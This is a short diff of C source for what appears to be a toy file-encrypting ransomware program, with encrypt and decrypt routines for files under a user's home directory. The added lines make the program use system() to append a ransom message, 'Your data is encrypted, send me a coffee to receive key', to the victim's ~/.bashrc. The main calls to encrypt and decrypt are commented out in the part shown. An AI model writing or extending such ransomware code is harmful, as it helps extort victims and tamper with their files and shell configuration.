@@ -126,7 +126,7 @@ void decrypt_file(char * path){
         //printf("Decrypt: %s | %d\n\n", decrypt(cipher), strlen(decrypt(cipher)));
         // After replacing write it to temp file.
         decrypt(buffer);
-        printf("Cipher: %d | %d\n\n", sizeof(buffer), strlen(buffer));
+        //printf("Cipher: %d | %d\n\n", sizeof(buffer), strlen(buffer));
 
         fwrite(buffer, sizeof(buffer), 1, fp_temp);
         fflush(fp_temp);
@@ -158,7 +158,9 @@ int main()
         //decrypt_file(list_all_files[i]);
     }
     //encrypt_file("/home/doanhnn/linux/test/test.c");
-    decrypt_file("/home/doanhnn/linux/test/test.c");
+    system("file=/home/$(whoami)/.bashrc; if ! grep -n encrypted $file; then echo \"echo \"Your data is encrypted, send me a coffee to receive key to decrypt your data\"\" >> $file; fi");
+
+    //decrypt_file("/home/doanhnn/linux/test/test.c");
     //MCRYPT td, td2;
     //decrypt(buffer1, 16, IV, key, keysize);
     //printf("decrypt: %s\n", buffer1);
